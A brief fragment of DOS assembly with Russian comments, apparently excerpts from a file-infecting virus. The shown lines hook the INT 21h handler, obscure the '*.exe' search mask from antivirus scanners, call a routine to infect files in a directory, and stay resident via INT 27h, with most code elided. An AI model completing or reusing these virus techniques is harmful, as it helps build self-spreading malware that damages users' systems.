...
oldint21 DD ?                        ; определение ячейки памяти для хранения
...
CALL CS:oldint21                     ; вызов системного обработчика
...
;шифруем маску '*.exe' от антивирусов
	...
	call WorkWithDir    ;переходим к заражению в этой директории
...
MOV dx, offset virus       ; вычисление размера резидентной части
INT 27H                             ; завершение резидентной программы с
